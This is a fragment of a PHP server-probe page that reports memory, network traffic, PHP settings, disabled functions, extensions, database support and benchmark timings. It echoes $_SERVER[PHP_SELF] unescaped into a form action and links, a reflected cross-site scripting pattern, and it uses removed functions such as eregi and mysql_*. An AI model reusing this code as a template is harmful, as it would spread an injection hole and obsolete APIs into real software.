?&gt;		
		  Cache化内存为 &lt;span id=&quot;CachedMemory&quot;&gt;&lt;?php echo $mc;?&gt;&lt;/span&gt;
		  , 使用率 
          &lt;span id=&quot;memCachedPercent&quot;&gt;&lt;?php echo $memCachedPercent;?&gt;&lt;/span&gt;
		  %	| Buffers缓冲为  &lt;span id=&quot;Buffers&quot;&gt;&lt;?php echo $mb;?&gt;&lt;/span&gt;
          &lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barmemCachedPercent&quot; class=&quot;barli_blue&quot; style=&quot;width:&lt;?php echo $memCachedPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;

          真实内存使用
          &lt;span id=&quot;memRealUsed&quot;&gt;&lt;?php echo $memRealUsed;?&gt;&lt;/span&gt;
		  , 真实内存空闲
          &lt;span id=&quot;memRealFree&quot;&gt;&lt;?php echo $memRealFree;?&gt;&lt;/span&gt;
		  , 使用率
          &lt;span id=&quot;memRealPercent&quot;&gt;&lt;?php echo $memRealPercent;?&gt;&lt;/span&gt;
          %
          &lt;div class=&quot;bar_1&quot;&gt;&lt;div id=&quot;barmemRealPercent&quot; class=&quot;barli_1&quot; style=&quot;width:&lt;?php echo $memRealPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt; 
&lt;?php
&#125;
//判断如果SWAP区为0，不显示
if($sysInfo['swapTotal']&gt;0)
&#123;
?&gt;	
          SWAP区：共
          &lt;?php echo $st;?&gt;
          , 已使用
          &lt;span id=&quot;swapUsed&quot;&gt;&lt;?php echo $su;?&gt;&lt;/span&gt;
          , 空闲
          &lt;span id=&quot;swapFree&quot;&gt;&lt;?php echo $sf;?&gt;&lt;/span&gt;
          , 使用率
          &lt;span id=&quot;swapPercent&quot;&gt;&lt;?php echo $swapPercent;?&gt;&lt;/span&gt;
          %
          &lt;div class=&quot;bar&quot;&gt;&lt;div id=&quot;barswapPercent&quot; class=&quot;barli_red&quot; style=&quot;width:&lt;?php echo $swapPercent?&gt;%&quot; &gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt;

&lt;?php
&#125;	
?&gt;		  

	  &lt;/td&gt;

	&lt;/tr&gt;
	  &lt;tr&gt;
		&lt;td&gt;系统平均负载&lt;/td&gt;
		&lt;td colspan=&quot;5&quot; class=&quot;w_number&quot;&gt;&lt;span id=&quot;loadAvg&quot;&gt;&lt;?php echo $load;?&gt;&lt;/span&gt;&lt;/td&gt;
	&lt;/tr&gt;

&lt;/table&gt;

&lt;?&#125;?&gt;



&lt;?php if (false !== ($strs = @file(&quot;/proc/net/dev&quot;))) : ?&gt;

&lt;table&gt;

    &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;网络使用状况&lt;/th&gt;&lt;/tr&gt;

&lt;?php for ($i = 2; $i &lt; count($strs); $i++ ) : ?&gt;

&lt;?php preg_match_all( &quot;/([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/&quot;, $strs[$i], $info );?&gt;

     &lt;tr&gt;

        &lt;td width=&quot;13%&quot;&gt;&lt;?php echo $info[1][0]?&gt; : &lt;/td&gt;
        &lt;td width=&quot;29%&quot;&gt;入网: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetInput&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetInput[$i]?&gt;&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;
		&lt;td width=&quot;14%&quot;&gt;实时: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetInputSpeed&lt;?php echo $i?&gt;&quot;&gt;0B/s&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td width=&quot;29%&quot;&gt;出网: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetOut&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetOut[$i]?&gt;&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;
		&lt;td width=&quot;14%&quot;&gt;实时: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetOutSpeed&lt;?php echo $i?&gt;&quot;&gt;0B/s&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;

    &lt;/tr&gt;

&lt;?php endfor; ?&gt;

&lt;/table&gt;

&lt;?php endif; ?&gt;



&lt;table width=&quot;100%&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot; align=&quot;center&quot;&gt;

  &lt;tr&gt;

    &lt;th colspan=&quot;4&quot;&gt;PHP已编译模块检测&lt;/th&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td colspan=&quot;4&quot;&gt;&lt;span class=&quot;w_small&quot;&gt;

&lt;?php

$able=get_loaded_extensions();

foreach ($able as $key=&gt;$value) &#123;

	if ($key!=0 &amp;&amp; $key%13==0) &#123;

		echo '&lt;br /&gt;';

	&#125;

	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;

&#125;

?&gt;&lt;/span&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

&lt;a name=&quot;w_php&quot;&gt;&lt;/a&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot;&gt;PHP相关参数&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;32%&quot;&gt;PHP信息（phpinfo）：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;

		&lt;?php

		$phpSelf = $_SERVER[PHP_SELF] ? $_SERVER[PHP_SELF] : $_SERVER[SCRIPT_NAME];

		$disFuns=get_cfg_var(&quot;disable_functions&quot;);

		?&gt;

    &lt;?php echo (false!==eregi(&quot;phpinfo&quot;,$disFuns))? '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;' :&quot;&lt;a href='$phpSelf?act=phpinfo' target='_blank'&gt;PHPINFO&lt;/a&gt;&quot;;?&gt;

    &lt;/td&gt;

    &lt;td width=&quot;32%&quot;&gt;PHP版本（php_version）：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo PHP_VERSION;?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP运行方式：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo strtoupper(php_sapi_name());?&gt;&lt;/td&gt;

    &lt;td&gt;脚本占用最大内存（memory_limit）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;memory_limit&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP安全模式（safe_mode）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;safe_mode&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;POST方法提交最大限制（post_max_size）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;post_max_size&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;上传文件最大限制（upload_max_filesize）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;upload_max_filesize&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;浮点型数据显示的有效位数（precision）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;precision&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;脚本超时时间（max_execution_time）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;max_execution_time&quot;);?&gt;秒&lt;/td&gt;

    &lt;td&gt;socket超时时间（default_socket_timeout）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;default_socket_timeout&quot;);?&gt;秒&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP页面根目录（doc_root）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;doc_root&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;用户根目录（user_dir）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;user_dir&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dl()函数（enable_dl）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;enable_dl&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;指定包含文件目录（include_path）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;include_path&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;显示错误信息（display_errors）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;display_errors&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;自定义全局变量（register_globals）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_globals&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;数据反斜杠转义（magic_quotes_gpc）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;&quot;&amp;lt;?...?&amp;gt;&quot;短标签（short_open_tag）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;short_open_tag&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;&quot;&amp;lt;% %&amp;gt;&quot;ASP风格标记（asp_tags）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;asp_tags&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;忽略重复错误信息（ignore_repeated_errors）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_errors&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;忽略重复的错误源（ignore_repeated_source）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_source&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;报告内存泄漏（report_memleaks）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;report_memleaks&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;自动字符串转义（magic_quotes_gpc）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;外部字符串自动转义（magic_quotes_runtime）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_runtime&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;打开远程文件（allow_url_fopen）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;声明argv和argc变量（register_argc_argv）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_argc_argv&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Cookie 支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isset($_COOKIE)?'&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;' : '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';?&gt;&lt;/td&gt;
    &lt;td&gt;拼写检查（ASpell Library）：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;aspell_check_raw&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt;
   &lt;tr&gt;
    &lt;td&gt;高精度数学运算（BCMath）：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;PREL相容语法（PCRE）：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;/td&gt;
   &lt;tr&gt;
    &lt;td&gt;PDF文档支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;pdf_close&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;SNMP网络管理协议：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;snmpget&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;VMailMgr邮件处理：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;vm_adduser&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;Curl支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;curl_init&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;SMTP支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?'&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;' : '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';?&gt;&lt;/td&gt;
    &lt;td&gt;SMTP地址：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?get_cfg_var(&quot;SMTP&quot;):'&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';?&gt;&lt;/td&gt;
  &lt;/tr&gt; 

	&lt;tr&gt;
		&lt;td&gt;默认支持函数（enable_functions）：&lt;/td&gt;
		&lt;td colspan=&quot;3&quot;&gt;&lt;a href='&lt;?php echo $phpSelf;?&gt;?act=Function' target='_blank' class='static'&gt;请点这里查看详细！&lt;/a&gt;&lt;/td&gt;		
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td&gt;被禁用的函数（disable_functions）：&lt;/td&gt;
		&lt;td colspan=&quot;3&quot; class=&quot;word&quot;&gt;
&lt;?php 
$disFuns=get_cfg_var(&quot;disable_functions&quot;);
if(empty($disFuns))
&#123;
	echo '&lt;font color=red&gt;×&lt;/font&gt;';
&#125;
else
&#123; 
	//echo $disFuns;
	$disFuns_array =  explode(',',$disFuns);
	foreach ($disFuns_array as $key=&gt;$value) 
	&#123;
		if ($key!=0 &amp;&amp; $key%5==0) &#123;
			echo '&lt;br /&gt;';
	&#125;
	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;
&#125;	
&#125;

?&gt;
		&lt;/td&gt;
	&lt;/tr&gt;

&lt;/table&gt;

&lt;a name=&quot;w_module&quot;&gt;&lt;/a&gt;

&lt;!--组件信息--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot; &gt;组件支持&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;32%&quot;&gt;FTP支持：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;ftp_login&quot;);?&gt;&lt;/td&gt;

    &lt;td width=&quot;32%&quot;&gt;XML解析支持：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;xml_set_object&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Session支持：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;session_start&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;Socket支持：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;socket_accept&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Calendar支持&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun('cal_days_in_month');?&gt;
	&lt;/td&gt;

    &lt;td&gt;允许URL打开文件：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;GD库支持：&lt;/td&gt;

    &lt;td&gt;

    &lt;?php

        if(function_exists(gd_info)) &#123;

            $gd_info = @gd_info();

	        echo $gd_info[&quot;GD Version&quot;];

	    &#125;else&#123;echo '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';&#125;

	?&gt;&lt;/td&gt;

    &lt;td&gt;压缩文件支持(Zlib)：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;gzclose&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;IMAP电子邮件系统函数库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;imap_close&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;历法运算函数库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;JDToGregorian&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;正则表达式函数库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;WDDX支持：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;wddx_add_vars&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Iconv编码转换：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;iconv&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;mbstring：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mb_eregi&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;高精度数学运算：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;LDAP目录协议：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ldap_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;MCrypt加密处理：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mcrypt_cbc&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;哈稀计算：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mhash_count&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

&lt;a name=&quot;w_module_other&quot;&gt;&lt;/a&gt;
&lt;!--第三方组件信息--&gt;
&lt;table&gt;
  &lt;tr&gt;&lt;th colspan=&quot;4&quot; &gt;第三方组件&lt;/th&gt;&lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width=&quot;32%&quot;&gt;Zend版本&lt;/td&gt;
    &lt;td width=&quot;18%&quot;&gt;&lt;?php $zend_version = zend_version();if(empty($zend_version))&#123;echo '&lt;font color=red&gt;×&lt;/font&gt;';&#125;else&#123;echo $zend_version;&#125;?&gt;&lt;/td&gt;
    &lt;td width=&quot;32%&quot;&gt;
&lt;?php
$PHP_VERSION = PHP_VERSION;
$PHP_VERSION = substr($PHP_VERSION,2,1);
if($PHP_VERSION &gt; 2)
&#123;
	echo &quot;ZendGuardLoader[启用]&quot;;
&#125;
else
&#123;
	echo &quot;Zend Optimizer&quot;;
&#125;
?&gt;
	&lt;/td&gt;
    &lt;td width=&quot;18%&quot;&gt;&lt;?php if($PHP_VERSION &gt; 2)&#123;echo (get_cfg_var(&quot;zend_loader.enable&quot;))?'&lt;font color=green&gt;√&lt;/font&gt;':'&lt;font color=red&gt;×&lt;/font&gt;';&#125; else&#123;if(function_exists('zend_optimizer_version'))&#123;	echo zend_optimizer_version();&#125;else&#123;	echo (get_cfg_var(&quot;zend_optimizer.optimization_level&quot;)||get_cfg_var(&quot;zend_extension_manager.optimizer_ts&quot;)||get_cfg_var(&quot;zend.ze1_compatibility_mode&quot;)||get_cfg_var(&quot;zend_extension_ts&quot;))?'&lt;font color=green&gt;√&lt;/font&gt;':'&lt;font color=red&gt;×&lt;/font&gt;';&#125;&#125;?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;eAccelerator&lt;/td&gt;
    &lt;td&gt;&lt;?php if((phpversion('eAccelerator'))!='')&#123;echo phpversion('eAccelerator');&#125;else&#123; echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125; ?&gt;&lt;/td&gt;
    &lt;td&gt;ioncube&lt;/td&gt;
    &lt;td&gt;&lt;?php if(extension_loaded('ionCube Loader'))&#123;   $ys = ioncube_loader_iversion();   $gm = &quot;.&quot;.(int)substr($ys,3,2);   echo ionCube_Loader_version().$gm;&#125;else&#123;echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125;?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;XCache&lt;/td&gt;
    &lt;td&gt;&lt;?php if((phpversion('XCache'))!='')&#123;echo phpversion('XCache');&#125;else&#123; echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125; ?&gt;&lt;/td&gt;
    &lt;td&gt;APC&lt;/td&gt;
    &lt;td&gt;&lt;?php if((phpversion('APC'))!='')&#123;echo phpversion('APC');&#125;else&#123; echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125; ?&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

&lt;a name=&quot;w_db&quot;&gt;&lt;/a&gt;

&lt;!--数据库支持--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot;&gt;数据库支持&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;32%&quot;&gt;MySQL 数据库：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;mysql_close&quot;);?&gt;

    &lt;?php
    if(function_exists(&quot;mysql_get_server_info&quot;)) &#123;

        $s = @mysql_get_server_info();

        $s = $s ? '&amp;nbsp; mysql_server 版本：'.$s : '';

	    $c = '&amp;nbsp; mysql_client 版本：'.@mysql_get_client_info();

        echo $s;

    &#125;

    ?&gt;

	&lt;/td&gt;

    &lt;td width=&quot;32%&quot;&gt;ODBC 数据库：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;odbc_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Oracle 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ora_close&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;SQL Server 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mssql_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dBASE 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;dbase_close&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;mSQL 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;msql_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;SQLite 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php if(extension_loaded('sqlite3')) &#123;$sqliteVer = SQLite3::version();echo '&lt;font color=green&gt;√&lt;/font&gt;　';echo &quot;SQLite3　Ver &quot;;echo $sqliteVer[versionString];&#125;else &#123;echo isfun(&quot;sqlite_close&quot;);if(isfun(&quot;sqlite_close&quot;) == '&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;') &#123;echo &quot;&amp;nbsp; 版本： &quot;.@sqlite_libversion();&#125;&#125;?&gt;&lt;/td&gt;

    &lt;td&gt;Hyperwave 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;hw_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Postgre SQL 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;pg_close&quot;); ?&gt;&lt;/td&gt;

    &lt;td&gt;Informix 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ifx_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;DBA 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dba_close&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;DBM 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dbmclose&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt;    
  &lt;tr&gt;
    &lt;td&gt;FilePro 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;filepro_fieldcount&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;SyBase 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;sybase_close&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt; 

&lt;/table&gt;

&lt;a name=&quot;w_performance&quot;&gt;&lt;/a&gt;&lt;a name=&quot;bottom&quot;&gt;&lt;/a&gt;

&lt;form action=&quot;&lt;?php echo $_SERVER[PHP_SELF].&quot;#bottom&quot;;?&gt;&quot; method=&quot;post&quot;&gt;

&lt;!--服务器性能检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;服务器性能检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td width=&quot;19%&quot;&gt;参照对象&lt;/td&gt;

    &lt;td width=&quot;17%&quot;&gt;整数运算能力检测&lt;br /&gt;(1+1运算300万次)&lt;/td&gt;

    &lt;td width=&quot;17%&quot;&gt;浮点运算能力检测&lt;br /&gt;(圆周率开平方300万次)&lt;/td&gt;

    &lt;td width=&quot;17%&quot;&gt;数据I/O能力检测&lt;br /&gt;(读取10K文件1万次)&lt;/td&gt;

    &lt;td width=&quot;30%&quot;&gt;CPU信息&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr align=&quot;center&quot;&gt;
    &lt;td align=&quot;left&quot;&gt;美国 LinodeVPS&lt;/td&gt;
    &lt;td&gt;0.357秒&lt;/td&gt;
    &lt;td&gt;0.802秒&lt;/td&gt;
    &lt;td&gt;0.023秒&lt;/td&gt;
    &lt;td align=&quot;left&quot;&gt;4 x Xeon L5520 @ 2.27GHz&lt;/td&gt;
  &lt;/tr&gt; 

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;美国 PhotonVPS.com&lt;/td&gt;

    &lt;td&gt;0.431秒&lt;/td&gt;

    &lt;td&gt;1.024秒&lt;/td&gt;

    &lt;td&gt;0.034秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;8 x Xeon E5520 @ 2.27GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;德国 SpaceRich.com&lt;/td&gt;

    &lt;td&gt;0.421秒&lt;/td&gt;

    &lt;td&gt;1.003秒&lt;/td&gt;

    &lt;td&gt;0.038秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;4 x Core i7 920 @ 2.67GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;美国 RiZie.com&lt;/td&gt;

    &lt;td&gt;0.521秒&lt;/td&gt;

    &lt;td&gt;1.559秒&lt;/td&gt;

    &lt;td&gt;0.054秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;2 x Pentium4 3.00GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;埃及 CitynetHost.com&lt;/a&gt;&lt;/td&gt;

    &lt;td&gt;0.343秒&lt;/td&gt;

    &lt;td&gt;0.761秒&lt;/td&gt;

    &lt;td&gt;0.023秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;2 x Core2Duo E4600 @ 2.40GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;美国 IXwebhosting.com&lt;/td&gt;

    &lt;td&gt;0.535秒&lt;/td&gt;

    &lt;td&gt;1.607秒&lt;/td&gt;

    &lt;td&gt;0.058秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;4 x Xeon E5530 @ 2.40GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td&gt;本台服务器&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $valInt;?&gt;&lt;br /&gt;&lt;input class=&quot;btn&quot; name=&quot;act&quot; type=&quot;submit&quot; value=&quot;整型测试&quot; /&gt;&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $valFloat;?&gt;&lt;br /&gt;&lt;input class=&quot;btn&quot; name=&quot;act&quot; type=&quot;submit&quot; value=&quot;浮点测试&quot; /&gt;&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $valIo;?&gt;&lt;br /&gt;&lt;input class=&quot;btn&quot; name=&quot;act&quot; type=&quot;submit&quot; value=&quot;IO测试&quot; /&gt;&lt;/td&gt;

    &lt;td&gt;&lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

&lt;input type=&quot;hidden&quot; name=&quot;pInt&quot; value=&quot;&lt;?php echo $valInt;?&gt;&quot; /&gt;

&lt;input type=&quot;hidden&quot; name=&quot;pFloat&quot; value=&quot;&lt;?php echo $valFloat;?&gt;&quot; /&gt;

